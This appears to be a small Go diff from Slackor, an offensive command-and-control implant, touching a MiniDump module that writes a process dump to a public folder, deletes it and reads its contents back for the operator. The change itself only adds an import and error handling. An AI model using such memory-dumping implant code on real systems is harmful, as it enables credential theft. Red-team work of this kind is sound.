@@ -9,6 +9,8 @@ import (
 	"syscall"
 	"unsafe"
 
+	"github.com/Coalfire-Research/Slackor/internal/slack"
+
 	"golang.org/x/sys/windows"
 )
 
@@ -106,7 +108,10 @@ func (m MiniDump) Run(clientID string, jobID string, args []string) (string, err
 	if err != nil {
 		return "", err
 	}
-	deleteFile("C:\\Users\\Public\\" + clientID + ".dmp")
+	err = os.Remove("C:\\Users\\Public\\" + clientID + ".dmp")
+	if err != nil {
+		return "", err
+	}
 	if r != 0 {
 		ret.FileContent, err = ioutil.ReadFile(f.Name())
 		if err != nil {
